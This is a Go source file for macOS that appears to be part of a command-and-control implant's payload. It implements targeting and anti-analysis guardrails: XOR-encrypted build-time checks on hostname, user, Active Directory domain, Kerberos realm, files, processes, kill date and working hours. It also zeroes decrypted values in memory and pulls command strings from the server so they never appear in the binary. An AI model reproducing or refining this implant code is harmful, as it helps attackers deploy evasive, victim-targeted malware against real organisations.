// server/docker/payloads/TCP_Darwin/exec_requirements_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
)

// Build-time variables that will be set via ldflags (XOR encrypted)
var (
	// Safety check variables - set at build time (XOR encrypted with xorKey)
	safetyHostname       string = ""
	safetyUsername       string = ""
	safetyDomain         string = ""
	safetyFilePath       string = ""
	safetyFileMustExist  string = "false"
	safetyProcess        string = ""
	safetyKillDate       string = ""
	safetyWorkHoursStart string = ""
	safetyWorkHoursEnd   string = ""
)

// decryptSafetyValue decrypts a XOR-encrypted safety value
func decryptSafetyValue(encrypted string) string {
	if encrypted == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}
	result := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		result[i] = decoded[i] ^ xorKey[i%len(xorKey)]
	}
	return string(result)
}

// clearString overwrites string memory to prevent recovery
func clearString(s *string) {
	if s == nil || *s == "" {
		return
	}
	// Get pointer to string header
	hdr := (*struct {
		Data uintptr
		Len  int
	})(unsafe.Pointer(s))
	if hdr.Data == 0 || hdr.Len == 0 {
		return
	}
	// Clear the backing array
	for i := 0; i < hdr.Len; i++ {
		*(*byte)(unsafe.Pointer(hdr.Data + uintptr(i))) = 0
	}
	*s = ""
}

// ExecReqTemplate stores exec requirements template strings received from server
type ExecReqTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Exec requirements template indices - must match server's common.go
const (
	// Command names (Darwin-specific)
	idxExecReqCmdScutil     = 400
	idxExecReqCmdDsconfigad = 401
	idxExecReqCmdDscl       = 402
	idxExecReqCmdPs         = 403
	idxExecReqCmdPgrep      = 404

	// Command arguments (Darwin-specific)
	idxExecReqArgGet       = 405
	idxExecReqArgLocalHost = 406
	idxExecReqArgShow      = 407
	idxExecReqArgLocalhost = 408
	idxExecReqArgList      = 409
	idxExecReqArgActiveDir = 410
	idxExecReqArgRead      = 411
	idxExecReqArgSlash     = 412
	idxExecReqArgAux       = 413
	idxExecReqArgCaseI     = 414

	// Environment variable names
	idxExecReqEnvUser    = 415
	idxExecReqEnvLogname = 416

	// File paths (Darwin-specific)
	idxExecReqPathKrb5Conf    = 417
	idxExecReqPathMitKerberos = 418
	idxExecReqPathTildeFwd    = 419

	// String patterns (Darwin-specific)
	idxExecReqPatternADDomain   = 420
	idxExecReqPatternDefRealm   = 421
	idxExecReqPatternServerConn = 422

	// String literals
	idxExecReqWordTrue    = 423
	idxExecReqTimeFmtFull = 424

	// Environment variable names (additional)
	idxExecReqEnvHostname = 320
	idxExecReqEnvShell    = 321

	// System info strings (for getSystemInfo.go)
	idxExecReqSysInfoStartupTime  = 322
	idxExecReqSysInfoStatusActive = 323
)

// Global exec req template storage (uses SecureTemplate for memory zeroing)
var globalExecReqTpl *SecureTemplate

// setExecReqTemplate stores the exec requirements template (converts to SecureTemplate)
func setExecReqTemplate(tpl *ExecReqTemplate) {
	// Zero old template before replacing
	if globalExecReqTpl != nil {
		globalExecReqTpl.Zero()
	}
	globalExecReqTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
}

// erTpl safely retrieves a template string by index
func erTpl(idx int) string {
	return globalExecReqTpl.Get(idx)
}

// getErStr gets exec req string from template (no fallbacks - templates sent during handshake)
func getErStr(idx int) string {
	return erTpl(idx)
}

// PerformSafetyChecks runs all configured safety checks
// Returns true if all checks pass, false otherwise
// Safety values are XOR encrypted - decrypt, compare, then clear from memory
func PerformSafetyChecks() bool {
	// If no safety checks are configured, allow execution
	if !hasSafetyChecks() {
		return true
	}

	// Check hostname (decrypt, compare, clear)
	if safetyHostname != "" {
		expected := decryptSafetyValue(safetyHostname)
		result := checkHostname(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check username (decrypt, compare, clear)
	if safetyUsername != "" {
		expected := decryptSafetyValue(safetyUsername)
		result := checkUsername(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check domain (decrypt, compare, clear)
	if safetyDomain != "" {
		expected := decryptSafetyValue(safetyDomain)
		result := checkDomain(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check file existence (decrypt, compare, clear)
	if safetyFilePath != "" {
		path := decryptSafetyValue(safetyFilePath)
		mustExistVal := decryptSafetyValue(safetyFileMustExist)
		mustExist := mustExistVal == getErStr(idxExecReqWordTrue)
		result := checkFile(path, mustExist)
		clearString(&path)
		clearString(&mustExistVal)
		if !result {
			return false
		}
	}

	// Check process (decrypt, compare, clear)
	if safetyProcess != "" {
		expected := decryptSafetyValue(safetyProcess)
		result := checkProcess(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check kill date (decrypt, compare, clear)
	if safetyKillDate != "" {
		expected := decryptSafetyValue(safetyKillDate)
		result := checkKillDate(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check working hours (decrypt, compare, clear)
	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
		start := decryptSafetyValue(safetyWorkHoursStart)
		end := decryptSafetyValue(safetyWorkHoursEnd)
		result := checkWorkingHours(start, end)
		clearString(&start)
		clearString(&end)
		if !result {
			return false
		}
	}

	return true
}

// hasSafetyChecks returns true if any safety checks are configured
func hasSafetyChecks() bool {
	return safetyHostname != "" ||
		safetyUsername != "" ||
		safetyDomain != "" ||
		safetyFilePath != "" ||
		safetyProcess != "" ||
		safetyKillDate != "" ||
		(safetyWorkHoursStart != "" && safetyWorkHoursEnd != "")
}

// checkHostname verifies the system hostname matches the expected value
func checkHostname(expected string) bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}

	// Also check using scutil for local hostname
	if !strings.EqualFold(hostname, expected) {
		cmd := exec.Command(getErStr(idxExecReqCmdScutil), getErStr(idxExecReqArgGet), getErStr(idxExecReqArgLocalHost))
		output, err := cmd.Output()
		if err == nil {
			hostname = strings.TrimSpace(string(output))
		}
	}

	// Case-insensitive comparison
	return strings.EqualFold(hostname, expected)
}

// checkUsername verifies the current username matches the expected value
func checkUsername(expected string) bool {
	currentUser, err := user.Current()
	if err != nil {
		// Fallback to environment variable
		username := os.Getenv(getErStr(idxExecReqEnvUser))
		if username == "" {
			username = os.Getenv(getErStr(idxExecReqEnvLogname))
		}
		return strings.EqualFold(username, expected)
	}

	// Case-insensitive comparison
	return strings.EqualFold(currentUser.Username, expected)
}

// checkDomain checks if the Mac is bound to an Active Directory domain
func checkDomain(expected string) bool {
	// Method 1: Check using dsconfigad
	if domain := checkADDomainDSConfig(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	// Method 2: Check using dscl (Directory Service command line)
	if domain := checkADDomainDSCL(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	// Method 3: Check Kerberos configuration
	if realm := checkKerberosRealm(); realm != "" {
		if strings.EqualFold(realm, expected) {
			return true
		}
	}

	// Method 4: Check Open Directory
	if domain := checkOpenDirectory(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	return false
}

// checkADDomainDSConfig checks Active Directory binding using dsconfigad
func checkADDomainDSConfig() string {
	cmd := exec.Command(getErStr(idxExecReqCmdDsconfigad), getErStr(idxExecReqArgShow))
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		// Look for "Active Directory Domain = domain.com"
		if strings.HasPrefix(line, getErStr(idxExecReqPatternADDomain)) {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				return strings.TrimSpace(parts[1])
			}
		}
	}

	return ""
}

// checkADDomainDSCL checks Active Directory using dscl
func checkADDomainDSCL() string {
	cmd := exec.Command(getErStr(idxExecReqCmdDscl), getErStr(idxExecReqArgLocalhost), getErStr(idxExecReqArgList), getErStr(idxExecReqArgActiveDir))
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	// Output will list AD domains
	domains := strings.Split(strings.TrimSpace(string(output)), "\n")
	if len(domains) > 0 && domains[0] != "" {
		return domains[0]
	}

	return ""
}

// checkKerberosRealm checks for Kerberos configuration
func checkKerberosRealm() string {
	// Check /etc/krb5.conf
	configPaths := []string{
		getErStr(idxExecReqPathKrb5Conf),
		getErStr(idxExecReqPathMitKerberos),
	}

	for _, path := range configPaths {
		if data, err := os.ReadFile(path); err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(strings.ToLower(line), getErStr(idxExecReqPatternDefRealm)) {
					if strings.Contains(line, "=") {
						parts := strings.Split(line, "=")
						if len(parts) > 1 {
							return strings.TrimSpace(parts[1])
						}
					}
				}
			}
		}
	}

	return ""
}

// checkOpenDirectory checks if bound to Open Directory
func checkOpenDirectory() string {
	cmd := exec.Command(getErStr(idxExecReqCmdDscl), getErStr(idxExecReqArgLocalhost), getErStr(idxExecReqArgRead), getErStr(idxExecReqArgSlash))
	output, err := cmd.Output()
	if err != nil {
		return ""
	}

	// Parse output for Open Directory server
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, getErStr(idxExecReqPatternServerConn)) {
			// Extract server name
			parts := strings.Fields(line)
			if len(parts) > 1 {
				return parts[len(parts)-1]
			}
		}
	}

	return ""
}

// checkFile verifies file existence based on the requirement
func checkFile(path string, mustExist bool) bool {
	// Expand ~ to home directory if present
	if strings.HasPrefix(path, getErStr(idxExecReqPathTildeFwd)) {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, path[2:])
		}
	}

	_, err := os.Stat(path)

	if mustExist {
		// File must exist - check passes if no error
		return err == nil
	} else {
		// File must NOT exist - check passes if error (file not found)
		return os.IsNotExist(err)
	}
}

// checkProcess checks if a specific process is running
func checkProcess(processName string) bool {
	// Method 1: Use ps command (more reliable on macOS)
	if checkProcessViaPS(processName) {
		return true
	}

	// Method 2: Use gopsutil as fallback
	return checkProcessGopsutil(processName)
}

// checkProcessViaPS uses the ps command to check for processes
func checkProcessViaPS(processName string) bool {
	// Use ps with wide output to avoid truncation
	cmd := exec.Command(getErStr(idxExecReqCmdPs), getErStr(idxExecReqArgAux))
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), strings.ToLower(processName)) {
			return true
		}
	}

	// Also check using pgrep for exact matches
	cmd = exec.Command(getErStr(idxExecReqCmdPgrep), getErStr(idxExecReqArgCaseI), processName)
	if err := cmd.Run(); err == nil {
		return true
	}

	return false
}

// checkProcessGopsutil uses gopsutil library for process checking
func checkProcessGopsutil(processName string) bool {
	processes, err := process.Processes()
	if err != nil {
		return false
	}

	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			continue
		}

		// Check exact name match
		if strings.EqualFold(name, processName) {
			return true
		}

		// For .app bundles, check if the name contains the process
		if strings.Contains(strings.ToLower(name), strings.ToLower(processName)) {
			return true
		}

		// Also check command line
		cmdline, err := p.Cmdline()
		if err == nil && strings.Contains(strings.ToLower(cmdline), strings.ToLower(processName)) {
			return true
		}
	}

	return false
}

// checkKillDate verifies the current date is before the kill date
func checkKillDate(killDateStr string) bool {
	// Parse kill date (format: "2006-01-02 15:04:05")
	killDate, err := time.Parse(getErStr(idxExecReqTimeFmtFull), killDateStr)
	if err != nil {
		// If we can't parse the kill date, fail safe and don't run
		return false
	}

	// Check if current time is before kill date
	return time.Now().Before(killDate)
}

// checkWorkingHours verifies the current time is within working hours
func checkWorkingHours(startTime, endTime string) bool {
	now := time.Now()

	// Parse start time (format: "HH:MM")
	startParts := strings.Split(startTime, ":")
	if len(startParts) != 2 {
		return false
	}

	var startHour, startMin int
	fmt.Sscanf(startParts[0], "%d", &startHour)
	fmt.Sscanf(startParts[1], "%d", &startMin)

	// Parse end time
	endParts := strings.Split(endTime, ":")
	if len(endParts) != 2 {
		return false
	}

	var endHour, endMin int
	fmt.Sscanf(endParts[0], "%d", &endHour)
	fmt.Sscanf(endParts[1], "%d", &endMin)

	// Create time objects for today with specified hours
	startToday := time.Date(now.Year(), now.Month(), now.Day(), startHour, startMin, 0, 0, now.Location())
	endToday := time.Date(now.Year(), now.Month(), now.Day(), endHour, endMin, 0, 0, now.Location())

	// Check if current time is within range
	return now.After(startToday) && now.Before(endToday)
}
